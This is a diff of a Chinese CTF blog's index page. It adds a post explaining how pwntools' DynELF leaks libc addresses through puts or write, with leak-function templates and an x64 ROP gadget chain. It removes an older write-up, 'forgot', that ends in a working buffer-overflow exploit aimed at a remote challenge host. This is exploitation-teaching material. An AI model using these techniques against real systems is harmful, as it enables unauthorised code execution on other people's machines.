@@ -251,6 +251,160 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/30/DynELF的应用/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xfgg">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xfgg">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/30/DynELF的应用/" itemprop="url">DynELF的应用</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-30T10:17:49+08:00">
+                2019-07-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/理论知识/" itemprop="url" rel="index">
+                    <span itemprop="name">理论知识</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>原文：<a href="http://bobao.360.cn/learning/detail/3298.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3298.html</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在没有目标系统libc文件的情况下，我们可以使用pwntools的DynELF模块来泄漏地址信息，从而获取到shell。本文针对linux下的puts和write，分别给出了实现DynELF关键函数leak的方法，并通过3道CTF题目介绍了这些方法的具体应用情况。</span><br></pre></td></tr></table></figure>
+
+<h3 id="DynELF"><a href="#DynELF" class="headerlink" title="DynELF"></a>DynELF</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，其基本代码框架如下。</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./xxx'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def leak(address):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">#各种预处理</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  payload = <span class="string">"xxxxxxxx"</span> + address + <span class="string">"xxxxxxxx"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">#各种处理</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  data = p.recv(4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  log.debug(<span class="string">"%#x =&gt; %s"</span> % (address, (data or <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">"./xxx"</span>))      <span class="comment">#初始化DynELF模块 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">systemAddress = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)  <span class="comment">#在libc文件中搜索system函数的地址</span></span><br><span class="line"></span><br><span class="line">需要使用者进行的工作主要集中在leak函数的具体实现上，上面的代码只是个模板。其中，address就是leak函数要泄漏信息的所在地址，而payload就是触发目标程序泄漏address处信息的攻击代码。</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">不管有没有libc文件，要想获得目标系统的system函数地址，首先都要求目标二进制程序中存在一个能够泄漏目标系统内存中libc空间内信息的漏洞。同时，由于我们是在对方内存中不断搜索地址信息，故我们需要这样的信息泄露漏洞能够被反复调用。以下是大致归纳的主要使用条件：</span><br><span class="line">1）目标程序存在可以泄露libc空间信息的漏洞，如<span class="built_in">read</span>@got就指向libc地址空间内；</span><br><span class="line"></span><br><span class="line">2）目标程序中存在的信息泄露漏洞能够反复触发，从而可以不断泄露libc地址空间内的信息。</span><br><span class="line"></span><br><span class="line">当然，以上仅仅是实现利用的基本条件，不同的目标程序和运行环境都会有一些坑需要绕过。接下来，我们主要针对write和puts这两个普遍用来泄漏信息的函数在实际配合DynELF工作时可能遇到的问题，给出相应的解决方法。</span><br></pre></td></tr></table></figure>
+
+<h3 id="write函数"><a href="#write函数" class="headerlink" title="write函数"></a>write函数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">write函数原型是write(fd, addr, len)，即将addr作为起始地址，读取len字节的数据到文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）。write函数的优点是可以读取任意长度的内存信息，即它的打印长度只受len参数控制，缺点是需要传递3个参数，特别是在x64环境下，可能会带来一些困扰。</span><br><span class="line">在x64环境下，函数的参数是通过寄存器传递的，rdi对应第一个参数，rsi对应第二个参数，rdx对应第三个参数，往往凑不出类似“pop rdi; ret”、“pop rsi; ret”、“pop rdx; ret”等3个传参的gadget。此时，可以考虑使用__libc_csu_init函数的通用gadget，具体原理请参见文章。简单的说，就是通过__libc_csu_init函数的两段代码来实现3个参数的传递，这两段代码普遍存在于x64二进制程序中，只不过是间接地传递参数，而不像原来，是通过pop指令直接传递参数。</span><br><span class="line"></span><br><span class="line">.text:000000000040075A   pop  rbx  <span class="comment">#需置为0，为配合第二段代码的call指令寻址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:000000000040075B   pop  rbp  <span class="comment">#需置为1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:000000000040075C   pop  r12  <span class="comment">#需置为要调用的函数地址，注意是got地址而不是plt地址，因为第二段代码中是call指令</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:000000000040075E   pop  r13  <span class="comment">#write函数的第三个参数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:0000000000400760   pop  r14  <span class="comment">#write函数的第二个参数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:0000000000400762   pop  r15  <span class="comment">#write函数的第一个参数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:0000000000400764   retn</span><br><span class="line"></span><br><span class="line">第二段代码如下</span><br><span class="line"></span><br><span class="line">.text:0000000000400740   mov  rdx, r13</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:0000000000400743   mov  rsi, r14</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:0000000000400746   mov  edi, r15d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:0000000000400749   call  qword ptr [r12+rbx*8]</span><br><span class="line"></span><br><span class="line">这两段代码运行后，会将栈顶指针移动56字节，我们在栈中布置56个字节即可。</span><br><span class="line"></span><br><span class="line">这样，我们便解决了write函数在leak信息中存在的问题，具体的应用会放到后面的3道题目中讲。</span><br></pre></td></tr></table></figure>
+
+<h3 id="puts函数"><a href="#puts函数" class="headerlink" title="puts函数"></a>puts函数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">puts的原型是puts(addr)，即将addr作为起始地址输出字符串，直到遇到“\x00”字符为止。也就是说，puts函数输出的数据长度是不受控的，只要我们输出的信息中包含\x00截断符，输出就会终止，且会自动将“\n”追加到输出字符串的末尾，这是puts函数的缺点，而优点就是需要的参数少，只有1个，无论在x32还是x64环境下，都容易调用。</span><br><span class="line">为了克服输入不受控这一缺点，我们考虑利用puts函数输出的字符串最后一位为“\n“这一特点，分两种情况来解决。</span><br><span class="line"></span><br><span class="line">（1）puts输出完后就没有其他输出，在这种情况下的leak函数可以这么写。</span><br><span class="line"></span><br><span class="line">def leak(address):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  count = 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  data = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  payload = xxx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span> p.recvuntil(<span class="string">'xxx\n'</span>) <span class="comment">#一定要在puts前释放完输出</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  up = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> True:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待1秒钟，如果确实接收不到了，就说明输出结束了</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#以便与不是标志字符串结束的回车符（0x0A）混淆，这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串””</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    c = p.recv(numb=1, timeout=1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    count += 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">'\n'</span> and c == <span class="string">""</span>:  <span class="comment">#接收到的上一个字符为回车符，而当前接收不到新字符，则</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      buf = buf[:-1]             <span class="comment">#删除puts函数输出的末尾回车符</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      buf += <span class="string">"\x00"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      buf += c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    up = c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  data = buf[:4]  <span class="comment">#取指定字节数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  log.info(<span class="string">"%#x =&gt; %s"</span> % (address, (data or <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">return</span> data</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">puts输出完后还有其他输出，在这种情况下的leak函数可以这么写。</span><br><span class="line"></span><br><span class="line">def leak(address):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  count = 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  data = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  payload = xxx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span> p.recvuntil(<span class="string">"xxx\n"</span>)) <span class="comment">#一定要在puts前释放完输出</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  up = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> True:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    c = p.recv(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    count += 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">'\n'</span> and c == <span class="string">"x"</span>:  <span class="comment">#一定要找到泄漏信息的字符串特征</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      data = buf[:-1]                     </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      data += <span class="string">"\x00"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      buf += c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    up = c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  data = buf[:4] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  log.info(<span class="string">"%#x =&gt; %s"</span> % (address, (data or <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">return</span> data</span><br></pre></td></tr></table></figure>
+
+<h3 id="其他需要注意的"><a href="#其他需要注意的" class="headerlink" title="其他需要注意的"></a>其他需要注意的</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在信息泄露过程中，由于循环制造溢出，故可能会导致栈结构发生不可预料的变化，可以尝试调用目标二进制程序的_start函数来重新开始程序以恢复栈</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/28/stack2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1634,160 +1788,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/27/forgot/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="xfgg">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xfgg">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/27/forgot/" itemprop="url">forgot</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-27T19:02:27+08:00">
-                2019-07-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/攻防世界/" itemprop="url" rel="index">
-                    <span itemprop="name">攻防世界</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec forgot</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/forgot'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br><span class="line">只开启了nx保护</span><br><span class="line"></span><br><span class="line">ida分析</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20190708074114251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70" alt></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现有两处溢出点</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20190708074419714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70" alt></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以观察到箭头处是个函数指针，&amp;v3 是v3在栈上的地址，&amp;v3 + --v14 是根据&amp;v3在栈上移动，上面的<span class="keyword">for</span>循环是用来改变v14的值，根据溢出点函数指针v3到v12 ，变量v14都可以被我们控制，接下来再找找有没有system函数</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20190708075022550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70" alt></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现目标函数</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">接下来我的想法是利用缓冲区溢出把函数指针v12 覆盖为地址0x080486cc,接下来再控制v14的值为10， 那么 &amp;v3+ --v14 便会指向</span><br><span class="line">v12，随后cat flag</span><br></pre></td></tr></table></figure>
-
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,39675)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*0x44 + p32(0x080486CC) + <span class="string">'a'</span>*0x20 + p32(0x8)</span><br><span class="line"></span><br><span class="line"><span class="comment">#利用缓冲区溢出把函数指针v12 覆盖为地址0x080486cc,接下来再控制v14的值为10， 那么 &amp;v3+ --v14 便会指向</span></span><br><span class="line"><span class="comment">#v12，随后cat flag</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"bbb"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1838,7 +1838,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-count">29</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
